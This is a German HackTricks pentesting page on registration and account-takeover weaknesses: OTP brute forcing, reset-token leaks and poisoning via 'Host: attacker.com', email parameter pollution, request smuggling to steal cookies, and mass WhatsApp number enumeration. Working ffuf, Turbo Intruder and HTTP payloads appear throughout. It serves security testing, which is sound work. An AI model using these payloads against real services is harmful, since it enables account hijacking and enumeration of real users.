# Registrierung & Takeover Schwachstellen

{{#include ../banners/hacktricks-training.md}}

## Registrierung Takeover

### Doppelte Registrierung

- Versuche, einen bereits existierenden Benutzernamen zu verwenden
- Teste verschiedene Varianten der E-Mail:
- Großschreibung
- +1@
- füge einen Punkt in die E-Mail ein
- Sonderzeichen im lokalen Teil der E-Mail (%00, %09, %20)
- Füge Leerzeichen nach der E-Mail an: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Versuche Canonicalization-Tricks des E-Mail-Anbieters (dienstabhängig):
- Gmail ignoriert Punkte und Subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` werden an `victim@gmail.com` zugestellt
- Einige Provider sind im lokalen Teil case-insensitive
- Einige Provider akzeptieren Unicode-Confusables. Probiere Homoglyphen und das soft hyphen `\u00AD` im lokalen Teil
- Missbrauche diese, um: Einzigartigkeitsprüfungen zu umgehen, doppelte Accounts/Workspace-Einladungen zu erhalten oder Opfer-Registrierungen zu blockieren (temporärer DoS), während du eine Takeover vorbereitest

### Benutzername-Enumeration

Prüfe, ob du herausfinden kannst, wann ein Benutzername bereits in der Anwendung registriert ist.

- Unterschiedliche Fehlermeldungen oder HTTP-Statuscodes
- Timing-Unterschiede (bestehender Nutzer kann Lookup bei IdP/DB auslösen)
- Autofill des Registrierungsformulars mit Profildaten für bekannte E-Mails
- Überprüfe Team-/Invite-Flows: Das Eingeben einer E-Mail kann offenbaren, ob ein Account existiert

### Passwort-Richtlinie

Beim Anlegen eines Benutzers überprüfe die Passwort-Richtlinie (prüfe, ob schwache Passwörter erlaubt sind).\
In diesem Fall kannst du versuchen, Zugangsdaten zu bruteforcen.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)um zu lernen, wie man Account-Takeovers versucht oder Informationen via **SQL Injections** in Registrierungsformularen extrahiert.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### E-Mail ändern

Wenn registriert, versuche, die E-Mail zu ändern und prüfe, ob diese Änderung korrekt validiert wird oder ob sie in beliebige E-Mails geändert werden kann.

### Weitere Prüfungen

- Prüfe, ob du **Wegwerf-E-Mails** (mailinator, yopmail, 1secmail, etc.) verwenden kannst oder die Blockliste mit Subaddressing wie `victim+mailinator@gmail.com` umgehen kannst
- Ein **langes Passwort** (>200) führt zu **DoS**
- Prüfe Rate Limits bei der Kontoerstellung
- Verwende username@**burp_collab**.net und analysiere den **Callback**
- Wenn Telefonverifizierung verwendet wird, prüfe Parsing-/Injection-Edge-Cases bei Telefonnummern

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Contact-discovery / identifier-enumeration oracles

Telefonnummerzentrierte Messenger stellen ein **presence oracle** bereit, sobald der Client Kontakte synchronisiert. Das Wiederholen von WhatsApp’s discovery requests lieferte historisch **>100M lookups per hour**, was nahezu vollständige Account-Enumerierungen ermöglichte.

**Angriffs-Workflow**

1. **Instrumentiere einen offiziellen Client** um die Address-book upload request zu erfassen (authentifizierter Blob normalisierter E.164-Nummern). Spiele sie mit vom Angreifer generierten Nummern erneut ab, während dieselben Cookies/device token wiederverwendet werden.
2. **Batch numbers per request**: WhatsApp akzeptiert Tausende von Identifikatoren und gibt registriert/unregistered plus Metadaten (business, companion, etc.) zurück. Analysiere die Antworten offline, um Ziel-Listen zu erstellen, ohne Opfer zu kontaktieren.
3. **Horizontally scale** die Enumeration mit SIM banks, cloud devices, oder residential proxies, sodass pro-account/IP/ASN Throttling nie ausgelöst wird.

**Dialing-plan modeling**

Modelliere den Wählplan jedes Landes, um ungültige Kandidaten zu überspringen. Der NDSS-Datensatz (`country-table.*`) listet Ländercodes, Adoptionsdichte und platform split, sodass du High-Hit-Bereiche priorisieren kannst. Beispiel-Seeding-Code:
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
Priorisiere Präfixe, die echten Zuteilungen entsprechen (Mobile Country Code + National Destination Code), bevor du das oracle abfragst, damit der Durchsatz nützlich bleibt.

**Enumerationen in gezielte Angriffe umwandeln**

- Füttere leaked Telefonnummern (z. B. Facebook’s 2021 breach) in das oracle, um zu erfahren, welche Identitäten noch aktiv sind, bevor du phishing, SIM-swapping oder spamming durchführst.
- Segmentiere Zensusdaten nach Land/OS/App-Typ, um Regionen mit schwacher SMS-Filterung oder hoher WhatsApp Business-Adoption für lokalisierte social engineering-Angriffe zu finden.

**Korrelation bei Public-Key-Wiederverwendung**

WhatsApp offenbart während des Session-Setups den X25519 identity key jedes Accounts. Fordere identity material für jede enumerated Nummer an und dedupliziere die public keys, um account farms, geklonte Clients oder unsichere Firmware aufzudecken — gemeinsame Keys deanonymisieren Multi-SIM-Operationen.

## Schwache E-Mail/Telefon-Verifikation (OTP/Magic Link)

Registrierungsabläufe verifizieren Besitz häufig über einen numerischen OTP oder einen magic-link-Token. Typische Fehler:

- Erratbarer oder kurzer OTP (4–6 Ziffern) ohne effektives Rate Limiting oder IP-/Device-Tracking. Versuche parallele Versuche und Header/IP-Rotation.
- OTP-Wiederverwendung über Aktionen oder Konten hinweg, oder nicht an einen spezifischen Nutzer/Aktion gebunden (z. B. derselbe Code funktioniert für Login und Signup oder funktioniert nach einer E-Mail-Änderung).
- Multi-value smuggling: manche Backends akzeptieren mehrere Codes und validieren, wenn einer passt. Probiere:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: unterscheide wrong vs expired vs wrong-user codes anhand von Status/Message/Body-Länge.
- Tokens werden nach Erfolg oder nach Passwort-/E-Mail-Änderung nicht invalidiert.
- Verifikations-Token sind nicht an User-Agent/IP gebunden, was einen Cross-Origin-Abschluss von angreiferkontrollierten Seiten erlaubt.

Bruteforce-Beispiel mit ffuf gegen einen JSON-OTP-Endpunkt:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Paralleles/gleichzeitiges Raten, um sequenzielle Sperren zu umgehen (verwende Turbo Intruder in Burp):

<details>
<summary>Turbo Intruder-Snippet zum Fluten von 6‑stelligen OTP‑Versuchen</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: submit the same valid OTP simultaneously in two sessions; sometimes one session becomes a verified attacker account while the victim flow also succeeds.
- Also test Host header poisoning on verification links (same as reset poisoning below) to leak or complete verification on attacker controlled host.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (bevor das Opfer sich registriert)

Eine mächtige Klasse von Problemen tritt auf, wenn ein Angreifer Aktionen an der E‑Mail des Opfers durchführt, bevor dieses sein Konto erstellt, und später wieder Zugriff gewinnt.

Wichtige Techniken zum Testen (an die Abläufe des Ziels anpassen):

- Classic–Federated Merge
- Angreifer: registriert ein klassisches Konto mit der E‑Mail des Opfers und setzt ein Passwort
- Opfer: meldet sich später mit SSO an (gleiche E‑Mail)
- Unsichere Merges können dazu führen, dass beide Parteien eingeloggt bleiben oder der Zugriff des Angreifers wiederhergestellt wird
- Unexpired Session Identifier
- Angreifer: erstellt ein Konto und hält eine langlebige Session (nicht ausloggen)
- Opfer: stellt das Passwort wieder her/legt ein Passwort fest und nutzt das Konto
- Prüfe, ob alte Sessions nach einem Reset oder der Aktivierung von MFA weiterhin gültig bleiben
- Trojan Identifier
- Angreifer: fügt dem vorerstellten Konto einen sekundären Identifier hinzu (Telefon, zusätzliche E‑Mail, oder verknüpft den IdP des Angreifers)
- Opfer: setzt das Passwort zurück; Angreifer nutzt später den trojan identifier, um zurückzusetzen/anzumelden
- Unexpired Email Change
- Angreifer: initiiert eine E‑Mail‑Änderung zur Angreifer‑E‑Mail und hält die Bestätigung zurück
- Opfer: stellt das Konto wieder her und beginnt es zu benutzen
- Angreifer: schließt später die ausstehende E‑Mail‑Änderung ab, um das Konto zu stehlen
- Non‑Verifying IdP
- Angreifer: verwendet einen IdP, der die E‑Mail‑Eigentümerschaft nicht verifiziert, um `victim@…` zu behaupten
- Opfer: registriert sich über den klassischen Weg
- Service merged anhand der E‑Mail, ohne `email_verified` zu prüfen oder eine lokale Verifizierung durchzuführen

Praktische Tipps

- Harvest flows und Endpunkte aus Web-/Mobile‑Bundles. Suche nach classic signup, SSO linking, email/phone change und password reset Endpunkten.
- Erstelle realistische Automation, um Sessions am Leben zu halten, während du andere Flows durchspielst.
- Für SSO‑Tests: stelle einen Test‑OIDC‑Provider bereit und gib Tokens mit `email`‑Claims für die Opferadresse und `email_verified=false` aus, um zu prüfen, ob der RP unverified IdPs vertraut.
- Nach jedem password reset oder jeder email‑Änderung überprüfe, dass:
- alle anderen Sessions und Tokens invalidiert werden,
- ausstehende email/phone‑Änderungen storniert werden,
- zuvor verknüpfte IdPs/E‑Mails/Telefonnummern erneut verifiziert werden.

Hinweis: Ausführliche Methodik und Fallstudien zu diesen Techniken sind in Microsofts pre‑hijacking‑Forschung dokumentiert (siehe Referenzen am Ende).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Fordere einen password reset für deine E‑Mail‑Adresse an
2. Klicke auf den password reset‑Link
3. Ändere das Passwort nicht
4. Klicke auf beliebige Drittanbieter‑Websites (z. B. Facebook, Twitter)
5. Fange die Anfrage im Burp Suite Proxy ab
6. Prüfe, ob der Referer‑Header ein password reset‑Token leak enthält.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Fange die password reset‑Anfrage in Burp Suite ab
2. Füge die folgenden Header in Burp Suite hinzu oder bearbeite sie: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Leite die Anfrage mit dem modifizierten Header weiter\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Suche nach einer password reset‑URL, die auf dem _host header_ basiert, z. B.: `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR bei API-Parametern <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Der Angreifer muss sich mit seinem Account anmelden und zur Funktion **Passwort ändern** gehen.
2. Starte Burp Suite und aktiviere Intercept für die Anfrage
3. Sende sie zum Repeater-Tab und bearbeite die Parameter : User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Schwaches Passwort-Reset-Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Das Passwort-Reset-Token sollte bei jeder Anforderung zufällig generiert und eindeutig sein.\
Versuche zu bestimmen, ob das Token abläuft oder ob es immer gleich ist; in einigen Fällen ist der Generierungsalgorithmus schwach und kann erraten werden. Folgende Variablen könnten vom Algorithmus verwendet werden.

- Timestamp
- UserID
- Email of User
- Firstname and Lastname
- Date of Birth
- Cryptography
- Number only
- Small token sequence ( characters between \[A-Z,a-z,0-9])
- Token reuse
- Token expiration date

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Trigger a password reset request using the API/UI for a specific email e.g: test@mail.com
2. Inspect the server response and check for `resetToken`
3. Then use the token in an URL like `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Passwort-Reset durch Username-Kollision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Registriere dich im System mit einem Benutzernamen, der identisch zum Benutzernamen des Opfers ist, aber mit Leerzeichen vor und/oder nach dem Benutzernamen eingefügt. z. B.: `"admin "`
2. Fordere ein Passwort-Reset für deinen bösartigen Benutzernamen an.
3. Nutze das an deine E-Mail gesendete Token und setze das Passwort des Opfers zurück.
4. Melde dich mit dem neuen Passwort beim Konto des Opfers an.

Die Plattform CTFd war für diesen Angriff verwundbar.\
Siehe: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account-Übernahme via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Finde ein XSS in der Anwendung oder auf einer Subdomain, wenn die Cookies auf die übergeordnete Domain gesetzt sind: `*.domain.com`
2. Leak the current **sessions cookie**
3. Authenticate as the user using the cookie

### Account-Übernahme via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Verwende **smuggler** um den Typ des HTTP Request Smuggling zu erkennen (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Erzeuge eine Anfrage, die den `POST / HTTP/1.1` mit den folgenden Daten überschreibt:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` mit dem Ziel, die Opfer per Open-Redirect zu burpcollab zu leiten und ihre Cookies zu stehlen\
3. Die finale Anfrage könnte wie folgt aussehen
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone berichtet, dass dieser Bug ausgenutzt wurde\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Account Takeover via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Erstelle ein Payload für CSRF, z. B.: “HTML form with auto submit for a password change”
2. Sende das Payload

### Account Takeover via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token kann zur Authentifizierung eines Benutzers verwendet werden.

- JWT mit einer anderen User ID / Email bearbeiten
- Auf schwache JWT-Signatur prüfen


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

Einige signup handlers führen ein upsert durch, wenn die angegebene E-Mail bereits existiert. Akzeptiert der Endpoint einen minimalen Body mit einer E-Mail und einem Passwort und erzwingt keine Besitzverifikation, überschreibt das Senden der E-Mail des Opfers dessen Passwort vor Authentifizierung.

- Discovery: Endpunktnamen aus gebündeltem JS (oder mobilem App-Traffic) sammeln, dann Basis-Pfade wie /parents/application/v4/admin/FUZZ mit ffuf/dirsearch fuzz'en.
- Method hints: Ein GET, das Nachrichten wie "Only POST request is allowed." zurückgibt, deutet oft auf das richtige Verb und darauf hin, dass ein JSON-Body erwartet wird.
- Minimaler Body, in freier Wildbahn beobachtet:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Beispiel PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Auswirkung: Full Account Takeover (ATO) ohne Reset-Token, OTP oder E-Mail-Verifizierung.

## Referenzen

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
